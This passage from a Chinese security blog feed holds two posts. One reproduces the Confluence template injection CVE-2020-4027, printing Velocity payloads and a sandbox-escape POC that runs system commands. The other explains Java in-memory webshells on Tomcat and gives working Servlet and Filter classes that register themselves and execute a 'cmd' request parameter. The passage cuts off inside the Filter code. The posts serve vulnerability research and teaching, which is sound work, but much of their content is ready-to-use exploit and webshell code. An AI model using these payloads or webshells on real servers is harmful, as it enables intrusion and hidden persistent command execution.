    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间，涛哥安排了个Confluence站点的测试，网上搜了下存在模板注入可导致命令执行，编号CVE-2020-4027。网上没有复现的文章，直到要交报告了还是没成功执行命令，只能交个模板注入导致文件读取悻悻而归。这件事如鲠在喉，于是抽空搭个环境复现了下。</p><a id="more"></a><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>复现环境本文使用的是Confluence 7.4.4的版本，官网有部署包可下，考虑到要下断点调试，没有使用Docker部署，数据库可以使用Docker起一个postgres，配置步骤网上有很多教程，本文就不具叙。</p><p>前期准备主要是IDEA怎么去调试的问题。开头就遇到坑，Xloggc的日志文件不支持中文，环境直接都启动不起来，最后排查下在service.bat里有Xloggc文件名参数，系统是中文的文件名也会是中文，删除掉百分号的内容即可。部署包自带一个tomcat，包里的confluence目录是项目的Web目录，刚开始想着从IDEA里启动tomcat，但不过是自带的tomcat，还是自己的tomcat启动后访问都是404。最后学着远程调试的方法，在自带tomcat的catalina.bat脚本开头加入以下一行调试命令，接着运行启动文件start-confluence.bat，并开启调试即可。</p><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><p>虽然网上没有找到具体的漏洞点，但根据CVE的描述和<a href="https://twitter.com/XiaoC75068775/status/1309673425984610306" target="_blank" rel="noopener">@Xiao_C</a>师傅的复现截图可得知漏洞点是出在用户宏(User macros)里，再查阅下文档和根据上一个模板注入漏洞CVE-2019-3396可知，用户宏可通过管理员的一般设置的用户宏处设置，然后在编辑文章的其他宏里预览触发。</p><p>用CVE-2019-3396的payload如下，试了下无法执行命令直接输出了模板的内容，根据CVE的描述得知是因为使用了沙箱导致的。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#set($e=&quot;exp&quot;)</span><br><span class="line">#set($a=$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec($cmd))</span><br><span class="line">#set($input=$e.getClass().forName(&quot;java.lang.Process&quot;).getMethod(&quot;getInputStream&quot;).invoke($a))</span><br><span class="line">#set($sc=$e.getClass().forName(&quot;java.util.Scanner&quot;))</span><br><span class="line">#set($constructor=$sc.getDeclaredConstructor($e.getClass().forName(&quot;java.io.InputStream&quot;)))</span><br><span class="line">#set($scan=$constructor.newInstance($input).useDelimiter(&quot;\\A&quot;))</span><br><span class="line">#if($scan.hasNext())</span><br><span class="line">    $scan.next()</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><p>那么先来看一个简单的velocity demo如下，最基本的会实例化模板引擎<code>VelocityEngine</code>和模板上下文<code>VelocityContext</code>。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Properties p = <span class="hljs-keyword">new</span> Properties();</span><br><span class="line">    VelocityEngine velocity = <span class="hljs-keyword">new</span> VelocityEngine();</span><br><span class="line">    velocity.init(p);</span><br><span class="line"></span><br><span class="line">    Template template = velocity.getTemplate(<span class="hljs-string">"test.vm"</span>, <span class="hljs-string">"utf-8"</span>);</span><br><span class="line">    VelocityContext context = <span class="hljs-keyword">new</span> VelocityContext();</span><br><span class="line">    StringWriter writer = <span class="hljs-keyword">new</span> StringWriter();</span><br><span class="line">    template.merge(context, writer);</span><br><span class="line">    writer.flush();</span><br><span class="line">    System.out.println(writer.toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调试可以先从<code>VelocityEngine</code>的<code>init</code>方法下手。在<code>init</code>下断点，然后重新运行网站的启动脚本，用于初始化的<code>Properties</code>对象有很多的配置，其中<code>runtime.introspector.uberspect</code>是与沙箱相关的一个配置。其使用<code>ConfluenceAnnotationBoxingUberspect</code>类进行配置。</p><p><img src="/2021/10/20/Confluence模板注入（CVE-2020-4027）复现/屏幕截图 2021-10-11 163940.png" alt></p><p>跟进<code>ConfluenceAnnotationBoxingUberspect</code>，最终找到它的父类<code>SecureUberspector</code>，是Volecity的默认沙箱。</p><p><img src="/2021/10/20/Confluence模板注入（CVE-2020-4027）复现/屏幕截图 2021-10-11 170656.png" alt></p><p>用前面的Demo加上<code>runtime.introspector.uberspect</code>属性，使用之前模板注入的payload进行测试，会抛出一句告警。</p><p><img src="/2021/10/20/Confluence模板注入（CVE-2020-4027）复现/屏幕截图 2021-10-15 154941.png" alt></p><p>搜寻一番，发现是在<code>SecureIntrospectorImpl</code>的<code>getMethod</code>方法输出的日志。跟进到同一个类中的<code>checkObjectExecutePermission</code>方法，验证对象是否合法。常规模板注入获取Class实例，一般通过<code>String</code>类型的Class实例调用<code>forName</code>方法，也就是<code>java.lang.Class</code>已经在黑名单类内，所以这种方式在这里就无法使用了。</p><p><img src="/2021/10/20/Confluence模板注入（CVE-2020-4027）复现/屏幕截图 2021-10-15 161716.png" alt></p><p>再回去看看CVE的描述，说是通过上下文绕过沙箱。接下来找找有哪些上下文属性，我这里在模板中执行String的<code>codePointBefore</code>方法并下断点。顺着调用栈往上找，在<code>GenericVelocityMacro</code>的<code>execute</code>方法里调用了<code>MacroUtils</code>的<code>defaultVelocityContext</code>方法。</p><p><img src="/2021/10/20/Confluence模板注入（CVE-2020-4027）复现/屏幕截图 2021-10-16 202253.png" alt></p><p>跟进<code>defaultVelocityContext</code>方法可以看到默认设置了<code>req</code>、<code>res</code>、<code>action</code>和<code>webwork</code>四个上下文属性。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Context <span class="hljs-title">createDefaultVelocityContext</span><span class="hljs-params">()</span> </span>&#123;</span><br><span class="line">    Context ctx = ConfluenceVelocityManager.getConfluenceVelocityContext();</span><br><span class="line">    HttpContext httpContext = <span class="hljs-keyword">new</span> StaticHttpContext();</span><br><span class="line">    HttpServletRequest request = httpContext.getRequest();</span><br><span class="line">    HttpServletResponse response = httpContext.getResponse();</span><br><span class="line">    ctx.put(<span class="hljs-string">"req"</span>, request != <span class="hljs-keyword">null</span> ? request : <span class="hljs-keyword">new</span> ConfluenceMockServletRequest());</span><br><span class="line">    ctx.put(<span class="hljs-string">"res"</span>, response);</span><br><span class="line">    Action action = getConfluenceActionSupport();</span><br><span class="line">    ctx.put(<span class="hljs-string">"action"</span>, action);</span><br><span class="line">    ctx.put(<span class="hljs-string">"webwork"</span>, <span class="hljs-keyword">new</span> VelocityWebWorkUtil(<span class="hljs-keyword">new</span> WebWorkVelocityContext((OgnlValueStack)<span class="hljs-keyword">null</span>), (OgnlValueStack)<span class="hljs-keyword">null</span>, (HttpServletRequest)<span class="hljs-keyword">null</span>, (HttpServletResponse)<span class="hljs-keyword">null</span>));</span><br><span class="line">    <span class="hljs-keyword">return</span> ctx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>req</code>做最终是实现<code>ServletRequest</code>接口的，具有<code>getServletContext</code>方法，可获得Servlet的上下文。而上下文中有attributes属性，其中包括<code>org.apache.tomcat.InstanceManager</code>的键值对，这个类名在Struts2的Poc中看过，可以通过<code>newInstance</code>方法new一个给定类名的实例。</p><p><img src="/2021/10/20/Confluence模板注入（CVE-2020-4027）复现/屏幕截图 2021-10-19 155958.png" alt></p><p>然后可以通过<code>ScriptEngineManager</code>或各种表达式语言执行命令。其实这个模板注入本质上是漏洞作者<a href="https://github.com/pwntester" target="_blank" rel="noopener">@pwntester</a>的另一个CVE漏洞<a href="https://securitylab.github.com/advisories/GHSL-2020-048-apache-velocity/" target="_blank" rel="noopener">Remote Code Execution in Apache Velocity</a>，而且作者也给出了POC如下。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;req.getServletContext().getAttribute(&apos;org.apache.tomcat.InstanceManager&apos;).newInstance(&apos;javax.script.ScriptEngineManager&apos;).getEngineByName(&apos;js&apos;).eval(&quot;java.lang.Runtime.getRuntime().exec(&apos;touch /tmp/pwned&apos;)&quot;)&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/10/20/Confluence模板注入（CVE-2020-4027）复现/屏幕截图 2021-10-20 121613.png" alt></p><p>在这之前遇到大坑了，官方说受影响版本包括7.5.0，我自己搭了个7.5.0版本，包括使用测试站点，用上面的payload是会直接原样输出的，也就是被沙箱拦截了。这一度让我以为方向错了，后来换个7.4.4版本就成功了，这就很无语了。</p><p><img src="/2021/10/20/Confluence模板注入（CVE-2020-4027）复现/屏幕截图 2021-10-20 151313.png" alt></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>水这篇文章的时间跨度好大，从九月底到现场，过了个国庆人都懈怠了。感觉写得有点乱，文中若有错误的地方，望各位师傅不吝斧正。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2020-045-atlassian_confluence/" target="_blank" rel="noopener">https://securitylab.github.com/advisories/GHSL-2020-045-atlassian_confluence/</a></p><p><a href="https://securitylab.github.com/advisories/GHSL-2020-048-apache-velocity/" target="_blank" rel="noopener">https://securitylab.github.com/advisories/GHSL-2020-048-apache-velocity/</a></p><p><a href="https://twitter.com/XiaoC75068775/status/1309673425984610306" target="_blank" rel="noopener">https://twitter.com/XiaoC75068775/status/1309673425984610306</a></p><p><a href="https://www.cnblogs.com/jinshiyill/p/5240906.html" target="_blank" rel="noopener">https://www.cnblogs.com/jinshiyill/p/5240906.html</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;前段时间，涛哥安排了个Confluence站点的测试，网上搜了下存在模板注入可导致命令执行，编号CVE-2020-4027。网上没有复现的文章，直到要交报告了还是没成功执行命令，只能交个模板注入导致文件读取悻悻而归。这件事如鲠在喉，于是抽空搭个环境复现了下。&lt;/p&gt;</summary>
    
    
    
    <category term="代码审计" scheme="http://127.0.0.1/categories/代码审计/"/>
    
    
    <category term="模板注入" scheme="http://127.0.0.1/tags/模板注入/"/>
    
  </entry>
  
  <entry>
    <title>Java内存马及其机制学习</title>
    <link href="http://127.0.0.1/2021/09/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%8A%E5%85%B6%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/"/>
    <id>http://127.0.0.1/2021/09/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%8A%E5%85%B6%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-09-27T06:37:53.000Z</published>
    <updated>2021-09-27T06:40:42.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>内存马之前有接触过，在阿里SRC的宙斯活动中薅了点羊毛，但当时只是会用，不了解他的原理。本文通过调试的方法了解内存马的原理，并实现常见的几种内存马。</p><a id="more"></a><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="Java-Web三大组件"><a href="#Java-Web三大组件" class="headerlink" title="Java Web三大组件"></a>Java Web三大组件</h3><h4 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h4><p>Servlet是Server Applet的缩写，即服务端小程序，可以接收客户端发送的请求，并将响应数据发送回客户端。Servlet是Java Web中最常用的一种组件，就算只用到了jsp或jspx开始，实际上也用到了Servlet，因为jsp和jspx本质上是HttpServlet，而HttpServlet又是Servlet的子类。</p><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><p>Filter可以在请求到达Servlet、响应到达客户端之前，对请求或响应做处理，因此Listener常被用来实现过滤或访问控制等。</p><h4 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h4><p>Listener是用来监听某一事件的，具体可实现统计在线用户数、访问统计等。Listener的种类很多，有<code>ServletContextAttributeListener</code>、<code>ServletRequestAttributeListener</code>、<code>ServletRequestListener</code>、<code>HttpSessionIdListener</code>和<code>HttpSessionAttributeListener</code>。其中<code>ServletRequestListener</code>是用来监听请求的，很适合实现内存马。</p><h3 id="两种上下文"><a href="#两种上下文" class="headerlink" title="两种上下文"></a>两种上下文</h3><p>与内存马相关的两种上下文是ApplicationContext和StandardContext。ApplicationContext是实现ServletContext的类，记录的是Servlet的一些上下文信息，而StandardContext记录的是包括web.xml在内的一些Web应用信息。</p><p>至于什么是Context，个人理解是与它的中文意思一样，上下文或语境，是一种小范围的环境变量，当然也因为是一个类，有相应的有方法操作这些上下文信息。</p><p>Context的获取也需要提一提，因为是后续内存马的加载依赖于StandardContext，是内存马的关键。其中常用的一种方法是通过HttpServletRequest对象的<code>getServletContext</code>方法获取ServletContext对象，实际上是封装了ApplicationContent的ApplicationContextFacade，而ApplicationContext又是tomcat中时实现ServletContext接口的类，然后其中有<code>context</code>属性，存储着StandardContext对象，可以通过反射获取。</p><p><img src="/2021/09/27/Java内存马及其机制学习/屏幕截图 2021-09-27 133752.png" alt></p><p>如果没有request的话，还可以从线程中获取，详细分析可以看长亭一位师傅的文章：<a href="https://zhuanlan.zhihu.com/p/114625962" target="_blank" rel="noopener">Tomcat的一种通用回显方法研究</a>，除此之外还有从MBean中获取，但相对复杂一些。</p><p><img src="/2021/09/27/Java内存马及其机制学习/屏幕截图 2021-09-27 135737.png" alt></p><h2 id="web-xml加载和Tomcat启动流程调试"><a href="#web-xml加载和Tomcat启动流程调试" class="headerlink" title="web.xml加载和Tomcat启动流程调试"></a>web.xml加载和Tomcat启动流程调试</h2><p>大多数师傅的内存马分析文章都是从ApplicationContext的<code>addServlet</code>、<code>addFilter</code>和<code>addListener</code>方法了解Java Web三大组件的加载原理的，但本文从web.xml加载和Tomcat启动流程的角度分析内存马原理，不过实质上都是一样的，最终修改StandardCotext的内容实现的。</p><p>既然是调试，要先做些准备工作，在IDEA中新建一个Java Web项目后，还需在maven中添加个<code>tomcat-embed-core</code>的依赖如下，版本则设置与本地tomcat版本相同，方便下断点和调试。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;tomcat-embed-core&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;8.5.71&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>由于对tomcat的源码没有研究，所以真不知道段点应该在哪里下，好在在网上找到篇文章叫<a href="https://blog.csdn.net/lblblblblzdx/article/details/80946526" target="_blank" rel="noopener">Tomcat应用 web.xml的加载过程</a>。文中提到web.xml的加载到StandardContext由<code>org.apache.catalina.startup.ContextConfig</code>类的<code>configureContext</code>方法实现。</p><p>此时在web.xml中配置三大组件如下，并在<code>configureContext</code>方法处下段点即可开始调试。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;p1ay2win&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.p1ay2win.JavaWebMemoryShell.exploit.ServletDemo&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;p1ay2win&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/p1ay2win&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">&lt;filter&gt;</span><br><span class="line">    &lt;filter-name&gt;p1ay2win&lt;/filter-name&gt;</span><br><span class="line">    &lt;filter-class&gt;com.p1ay2win.JavaWebMemoryShell.exploit.FilterDemo&lt;/filter-class&gt;</span><br><span class="line">&lt;/filter&gt;</span><br><span class="line">&lt;filter-mapping&gt;</span><br><span class="line">    &lt;filter-name&gt;p1ay2win&lt;/filter-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;</span><br><span class="line">&lt;/filter-mapping&gt;</span><br><span class="line"></span><br><span class="line">&lt;listener&gt;</span><br><span class="line">    &lt;listener-class&gt;com.p1ay2win.JavaWebMemoryShell.exploit.ListenerDemo&lt;/listener-class&gt;</span><br><span class="line">&lt;/listener&gt;</span><br></pre></td></tr></table></figure><p>使用webxml对象，也就是web.xml解析后的内容，调用的方法名可得知，<code>configureContext</code>方法先后使用属性<code>context</code>，也就是StandardContext的实例，添加Fiter、Listener和Servlet。</p><p><img src="/2021/09/27/Java内存马及其机制学习/屏幕截图 2021-09-26 232643.png" alt></p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;</span><br><span class="line">    Wrapper wrapper = context.createWrapper();</span><br><span class="line">    ...</span><br><span class="line">    wrapper.setName(servlet.getServletName());</span><br><span class="line">    ...</span><br><span class="line">    wrapper.setServletClass(servlet.getServletClass());</span><br><span class="line">    ...</span><br><span class="line">    context.addChild(wrapper);</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-keyword">for</span> (Entry&lt;String, String&gt; entry : webxml.getServletMappings().entrySet()) &#123;</span><br><span class="line">    context.addServletMappingDecoded(entry.getKey(), entry.getValue());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先说说Servlet加载的流程，StandardContext实例新建一个Wrapper，然后封装进Servlet名和Servlet类名的信息，在加入为StandardContext的子容器，这里对于的是web.xml中的<code>&lt;servlet&gt;</code>；接着获取ServletMapping信息，加入到StandardContext的ServletMapping中，对应的是<code>&lt;servlet-mapping&gt;</code>。</p><p>在Filter的加载流程中，先后将FilterDef和FilterMap加入到StandardContext实例中，对应的是<code>&lt;filter&gt;</code>和<code>&lt;filter-mapping&gt;</code>。</p><p>在Listener的加载流程中，只需将filter名加入到StandardContext实例的applicationListener中。</p><p>按照上述流程，写一个Servlet的内存马是正常的，而Filter和Listener就没有生效，与ApplicationContext的<code>addFilter</code>和<code>addListener</code>方法和正常加载web.xml的StandardContext实例对比，StandardContext实例正常情况下Filter还设置了的filterConfig，而Listener还设置了applicationEventListener。</p><p>对这两个属性下断点，加载了web.xml配置后，StandardContext实例还分别调用<code>listenerStart</code>和<code>filterStart</code>方法，设置了上述两个属性，所以内存马最终也需要调用<code>listenerStart</code>和<code>filterStart</code>方法才完成Listener和Filter的加载。</p><p><img src="/2021/09/27/Java内存马及其机制学习/屏幕截图 2021-09-27 110219.png" alt></p><p><img src="/2021/09/27/Java内存马及其机制学习/屏幕截图 2021-09-27 110946.png" alt></p><p>再说一个尝试写内存马时候遇到的坑，一开始也像网上大多数的例子一样在方法里实现Servlet、Filter和Listener接口，并实例化；然后完全按照tomcat启动流程加载这三个组件的时候没效果，在一个报错页面中看到无法实例化的异常，在StandardContext实例确实也没看到这三个组件的实例。于是从StandardContext的<code>stratInternal</code>方法一步一步调，发现会使用传入的三个组件的类名进行实例化，由于是在方法里实现的三个组件的接口类，这三个组件的类属于是内部类，所以普通的反射没法实例化这三个类，导致这三个组件没法正常加载。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>此处小结总结下三个主键的加载条件</p><p><strong>Servlet</strong></p><ul><li>Wrapper封装Servlet的信息</li><li>加入Wrapper到StandardContext的children中</li></ul><p><strong>Filter</strong></p><ul><li>加入到StandardContext的filterDefs</li><li>加入到StandardContext的filterMaps</li><li>加入到StandardContext的filterConfigs</li></ul><p><strong>Listener</strong></p><ul><li>加入Listener对象到StandardContext的applicationEventListener中</li></ul><h2 id="三种内存马实现"><a href="#三种内存马实现" class="headerlink" title="三种内存马实现"></a>三种内存马实现</h2><p>这里直接贴代码了</p><ul><li>Servlet</li></ul><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> com.p1ay2win.JavaWebMemoryShell.exploit;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> org.apache.catalina.Wrapper;</span><br><span class="line"><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="hljs-keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="hljs-keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ServletDemo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ServletDemo</span><span class="hljs-params">()</span> </span>&#123;</span><br><span class="line">        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">        StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span> (standardContext.findServletMapping(<span class="hljs-string">"/p1ay2win"</span>) == <span class="hljs-keyword">null</span>) &#123;</span><br><span class="line">            Wrapper wrapper = standardContext.createWrapper();</span><br><span class="line">            wrapper.setName(<span class="hljs-string">"p1ay2win"</span>);</span><br><span class="line">            wrapper.setServletClass(<span class="hljs-keyword">this</span>.getClass().getName());</span><br><span class="line">            standardContext.addChild(wrapper);</span><br><span class="line"></span><br><span class="line">            standardContext.addServletMappingDecoded(<span class="hljs-string">"/p1ay2win"</span>, <span class="hljs-string">"p1ay2win"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-meta">@Override</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="hljs-string">"cmd /c"</span> + request.getParameter(<span class="hljs-string">"cmd"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Filter</li></ul><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> com.p1ay2win.JavaWebMemoryShell.exploit;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="hljs-keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class="line"><span class="hljs-keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;</span><br><span class="line"><span class="hljs-keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="hljs-keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FilterDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">FilterDemo</span><span class="hljs-params">()</span> </span>&#123;</span><br><span class="line">        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">        StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span> (standardContext.findFilterDef(<span class="hljs-string">"p1ay2win"</span>) == <span class="hljs-keyword">null</span>) &#123;</span><br><span class="line">            FilterDef filterDef = <span class="hljs-keyword">new</span> FilterDef();</span><br><span class="line">            filterDef.setFilterName(<span class="hljs-string">"p1ay2win"</span>);</span><br><span class="line">            filterDef.setFilterClass(<span class="hljs-keyword">this</span>.getClass().getName());</span><br><span class="line">            standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">            FilterMap filterMap = <span class="hljs-keyword">new</span> FilterMap();</span><br><span class="line">            filterMap.setFilterName(<span class="hljs-string">"p1ay2win"</span>);</span><br><span class="line">            filterMap.addURLPattern(<span class="hljs-string">"/*"</span>);</span><br><span class="line">            standardContext.addFilterMap(filterMap);</span><br><span class="line">            standardContext.filterStart();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-meta">@Override</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-meta">@Override</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="hljs-string">"cmd /c "</span> + servletRequest.getParameter(<span class="hljs-string">"cmd"</span>));</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-meta">@Override</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span 